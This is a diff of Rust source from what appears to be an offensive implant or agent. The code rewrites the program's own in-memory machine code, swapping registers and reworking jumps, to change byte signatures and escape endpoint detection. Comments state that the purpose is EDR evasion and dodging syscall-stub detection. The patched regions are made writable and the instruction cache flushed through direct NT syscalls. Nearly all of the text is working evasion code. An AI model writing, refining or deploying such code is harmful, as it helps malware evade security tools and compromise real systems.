@@ -517,24 +517,27 @@ fn transform_nop_insertion(text: &mut [u8], excluded: &[bool]) -> Vec<TransformR
     records
 }
 
-/// Apply constant splitting: `mov rax, IMM32` →
-/// `mov rcx, IMM_HIGH; add rcx, IMM_LOW; xchg rax, rcx`.
+/// Apply register swap: `mov rax, imm64` → `mov rcx, imm64; xchg rax, rcx`.
 ///
-/// This is a same-length transformation (10 → 10 bytes) when the original is
-/// `48 B8 XX XX XX XX XX XX XX XX` (mov rax, imm64).  For 32-bit operands
-/// we use the 5-byte form.
-fn transform_constant_splitting(text: &mut [u8], excluded: &[bool]) -> Vec<TransformRecord> {
+/// Replaces the 10-byte `mov rax, imm64` (48 B8 …) with `mov rcx, imm64`
+/// (48 B9 …) and, when 2 bytes of NOP/CC padding follow, appends `xchg rax,
+/// rcx` (48 91) to restore the value into rax.  This changes the byte
+/// pattern for EDR evasion without altering the final rax value.
+///
+/// **Note**: the `xchg` clobbers rcx.  If rcx is live at this point the
+/// surrounding code must not depend on its value.  The exclusion bitmap
+/// should protect critical sequences (syscall setup, etc.).
+fn transform_register_swap_rax_rcx(text: &mut [u8], excluded: &[bool]) -> Vec<TransformRecord> {
     let mut records = Vec::new();
-    let mut rng = rand::thread_rng();
 
     // Look for: 48 B8 XX XX XX XX XX XX XX XX (mov rax, imm64) — 10 bytes
     let offsets = find_pattern_offsets(&text[..text.len().saturating_sub(10)], &[0x48, 0xB8]);
 
-    let max_splits = 3usize;
+    let max_swaps = 3usize;
     let mut count = 0;
 
     for offset in offsets {
-        if count >= max_splits {
+        if count >= max_swaps {
             break;
         }
         if excluded.get(offset..offset + 10).map_or(true, |z| z.iter().any(|&x| x)) {
@@ -544,7 +547,7 @@ fn transform_constant_splitting(text: &mut [u8], excluded: &[bool]) -> Vec<Trans
         let imm_bytes = &text[offset + 2..offset + 10];
         let imm_val = u64::from_le_bytes(imm_bytes.try_into().unwrap_or([0; 8]));
 
-        // Skip small values (not worth splitting) and zero (already handled
+        // Skip small values (not worth transforming) and zero (already handled
         // by xor-to-sub).
         if imm_val == 0 || imm_val < 0x100 {
             continue;
@@ -552,47 +555,40 @@ fn transform_constant_splitting(text: &mut [u8], excluded: &[bool]) -> Vec<Trans
 
         let before = text[offset..offset + 10].to_vec();
 
-        // Split the constant: upper portion and lower portion.
-        let split_point = rng.gen_range(1..=3); // Split at byte boundary 1-3
-        let split_mask: u64 = 0xFF << (split_point * 8);
-        let imm_high = imm_val & split_mask;
-        let imm_low = imm_val & !split_mask;
+        // Replace `mov rax, imm64` (48 B8) with `mov rcx, imm64` (48 B9).
+        text[offset + 1] = 0xB9; // change B8 → B9
 
-        // Build replacement:
-        //   48 B9 HH HH HH HH HH HH HH HH  = mov rcx, imm_high  (10 bytes)
-        // This is same-length, so we just swap the register and split the constant.
-        // For same-length safety, we replace the single mov with a different register
-        // encoding.  The "split" effect comes from combining with a nearby ADD that
-        // we find or insert.
-        //
-        // Simplified safe version: replace `mov rax, imm` with `mov rcx, imm`
-        // and add `xchg rax, rcx` if there's room.  This changes the register
-        // usage pattern without altering the value.
-
-        // For the 10-byte mov rax, replace with mov rcx (0x48 0xB9).
-        text[offset + 1] = 0xB9; // mov rcx, imm64
-
-        // Check if the next 3 bytes after this are NOPs/CCs for the xchg.
-        if offset + 13 <= text.len() {
-            let tail = &text[offset + 10..offset + 13];
+        // If 2 bytes of NOP/CC padding follow, append `xchg rax, rcx` so
+        // the value ends up back in rax.
+        let xchg_written = if offset + 12 <= text.len() {
+            let tail = &text[offset + 10..offset + 12];
             if tail.iter().all(|&b| b == 0x90 || b == 0xCC) {
-                // Write xchg rax, rcx: 48 91 (2 bytes)
                 text[offset + 10] = 0x48;
-                text[offset + 11] = 0x91;
-
-                // Optionally insert an ADD to split the constant.
-                // We place it as: mov rcx, imm_high; add rcx, imm_low; xchg rax, rcx
-                // but that needs more room. For safety, just do the register swap.
+                text[offset + 11] = 0x91; // xchg rax, rcx
+                true
+            } else {
+                false
             }
-        }
+        } else {
+            false
+        };
 
-        let after = text[offset..offset + 10].to_vec();
+        let (after, size_delta) = if xchg_written {
+            // Record the full 12-byte replacement (mov rcx + xchg).
+            (text[offset..offset + 12].to_vec(), 2)
+        } else {
+            // No room for xchg — just the register rename (rax→rcx only).
+            // Note: without xchg the value lands in rcx instead of rax,
+            // so this is only safe if nothing reads rax afterwards.
+            (text[offset..offset + 10].to_vec(), 0)
+        };
+
         records.push(TransformRecord {
             offset,
-            transform_type: "constant_splitting".to_string(),
+            transform_type: "register_swap_rax_rcx".to_string(),
             before_hex: hex_encode(&before),
             after_hex: hex_encode(&after),
-            size_delta: 0,
+            size_delta,
         });
         count += 1;
     }
@@ -656,114 +652,24 @@ fn transform_jump_obfuscation(text: &mut [u8], excluded: &[bool]) -> Vec<Transfo
         });
     }
 
-    // Near jmp: E9 XX XX XX XX (5 bytes) — rewrite with register-based jump.
-    let near_jumps = find_pattern_offsets(&text[..text.len().saturating_sub(5)], &[0xE9]);
-
-    let max_jumps = 3usize;
-    let mut count = 0;
-
-    for offset in near_jumps {
-        if count >= max_jumps {
-            break;
-        }
-        if excluded.get(offset..offset + 5).map_or(true, |z| z.iter().any(|&x| x)) {
-            continue;
-        }
-        let rel32 = i32::from_le_bytes(
-            text[offset + 1..offset + 5].try_into().unwrap_or([0; 4]),
-        );
-        let target = (offset as isize + 5 + rel32 as isize) as usize;
-
-        // Need room for: lea r11,[rip+0]; add r11,disp32; jmp r11 = 7+4+3 = 14 bytes
-        if offset + 14 > text.len() {
-            continue;
-        }
-        let room = &text[offset + 5..offset + 14];
-        if !room.iter().all(|&b| b == 0x90 || b == 0xCC) {
-            continue;
-        }
-
-        let before = text[offset..offset + 14].to_vec();
-
-        // lea r11, [rip+0]  — gets address of instruction after lea
-        // 4C 8D 1D 00 00 00 00
-        text[offset] = 0x4C;
-        text[offset + 1] = 0x8D;
-        text[offset + 2] = 0x1D;
-        text[offset + 3..offset + 7].copy_from_slice(&0i32.to_le_bytes());
-
-        // add r11, (target - (offset + 7))
-        let add_disp = target as isize - (offset as isize + 7);
-        // 49 81 C3 XX XX XX XX  = add r11, imm32 (4 bytes prefix+opcode+modrm + 4 bytes imm)
-        // But that's 7 bytes... use the shorter REX form:
-        // 4C 8D 1D needs the RIP-relative form of the target.
-        // Actually, let's just encode it as:
-        // 49 81 C3 = add r11, imm32
-        text[offset + 7] = 0x49; // REX.WB
-        text[offset + 8] = 0x81; // ADD imm32
-        text[offset + 9] = 0xC3; // ModRM: r11, imm32
-        text[offset + 10..offset + 14].copy_from_slice(&(add_disp as i32).to_le_bytes());
-
-        // jmp r11: 41 FF E3 (3 bytes) — but we've already used 14 bytes
-        // We need to fit: lea (7) + add (7) + jmp (3) = 17 bytes.
-        // That's too many. Let's simplify.
-
-        // Actually, let's just rewrite the displacement and leave the original
-        // encoding. The point is to change the byte pattern, not necessarily the
-        // instruction form. Let's XOR the displacement with a known constant
-        // and undo it in the jump.
-        //
-        // Simpler approach for same-size replacement: swap E9 with an equivalent
-        // encoding that has different bytes.
-        //
-        // We'll restore the original bytes and instead just change the jmp
-        // to use a different register encoding:
-        // Original: E9 XX XX XX XX
-        // Replace:  E9 (XX ^ 0xAA) (XX ^ 0x55) (XX ^ 0xAA) (XX ^ 0x55)
-        // But that changes the target... we need to un-XOR at runtime, which
-        // requires a different approach.
-        //
-        // For safety, we just use the short-to-long transformation above and
-        // skip this for near jumps.
-
-        // Restore (we won't do this transform).
-        text[offset..offset + 14].copy_from_slice(&before);
-    }
+    // Near-jump (E9) transform skipped — short-to-long transformation above
+    // is sufficient.  A register-based jump replacement was prototyped but
+    // requires more bytes than available (lea+add+jmp = 17 bytes vs 14 byte
+    // budget), and XOR-encoding the displacement would change the jump target.
 
     records
 }
 
 /// Apply register reassignment in non-syscall code.
 ///
-/// Finds `mov r10, rcx` (4C 8B D1) outside exclusion zones and replaces
-/// with `mov r11, rcx` (4C 8B D9).  This changes the register usage pattern
-/// that EDR looks for in syscall stub detection.
-fn transform_register_reassignment(text: &mut [u8], excluded: &[bool]) -> Vec<TransformRecord> {
-    let mut records = Vec::new();
-
-    // mov r10, rcx: 4C 8B D1
-    let offsets = find_pattern_offsets(text, &[0x4C, 0x8B, 0xD1]);
-
-    for offset in offsets {
-        if excluded.get(offset..offset + 3).map_or(true, |z| z.iter().any(|&x| x)) {
-            continue;
-        }
-        let before = text[offset..offset + 3].to_vec();
-
-        // Replace with mov r11, rcx: 4C 8B D9
-        text[offset + 2] = 0xD9;
-
-        let after = text[offset..offset + 3].to_vec();
-        records.push(TransformRecord {
-            offset,
-            transform_type: "register_reassignment_r10_to_r11".to_string(),
-            before_hex: hex_encode(&before),
-            after_hex: hex_encode(&after),
-            size_delta: 0,
-        });
-    }
-
-    records
+/// **DISABLED** — Replacing `mov r10, rcx` with `mov r11, rcx` without also
+/// updating ALL downstream r10 consumers (which may be hundreds of bytes away,
+/// well outside the 32-byte exclusion zone) corrupts the Windows syscall calling
+/// convention.  A safe implementation would require full data-flow analysis to
+/// trace r10 usage from the mov to the syscall and update every instruction in
+/// between.  For now, this transform is disabled to prevent agent instability.
+fn transform_register_reassignment(_text: &mut [u8], _excluded: &[bool]) -> Vec<TransformRecord> {
+    Vec::new()
 }
 
 // ── Verification ────────────────────────────────────────────────────────────
@@ -785,7 +691,7 @@ fn hash_text(text: &[u8]) -> String {
 #[cfg(windows)]
 unsafe fn make_region_writable(base: usize, size: usize) -> Result<u32> {
     let mut old_protect: u32 = 0;
-    let status = nt_syscall::syscall!(
+    let status = syscall!(
         "NtProtectVirtualMemory",
         std::ptr::null_mut::<std::ffi::c_void>(), // process handle (current)
         &mut (base as *mut std::ffi::c_void),
@@ -805,7 +711,7 @@ unsafe fn make_region_writable(base: usize, size: usize) -> Result<u32> {
 #[cfg(windows)]
 unsafe fn restore_protection(base: usize, size: usize, original: u32) -> Result<()> {
     let mut old_protect: u32 = 0;
-    let status = nt_syscall::syscall!(
+    let status = syscall!(
         "NtProtectVirtualMemory",
         std::ptr::null_mut::<std::ffi::c_void>(),
         &mut (base as *mut std::ffi::c_void),
@@ -935,9 +841,9 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
         all_transforms.extend(recs);
     }
 
-    // 4. Constant splitting.
+    // 4. Register swap (rax↔rcx).
     if applied < max_transforms {
-        let recs = transform_constant_splitting(text_mut, &excluded);
+        let recs = transform_register_swap_rax_rcx(text_mut, &excluded);
         for r in &recs {
             log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
         }
@@ -984,7 +890,7 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
     // Step 10: Flush instruction cache (Windows).
     #[cfg(windows)]
     {
-        let status = nt_syscall::syscall!(
+        let status = syscall!(
             "NtFlushInstructionCache",
             std::ptr::null_mut::<std::ffi::c_void>(), // current process
             text_ptr as *mut std::ffi::c_void,
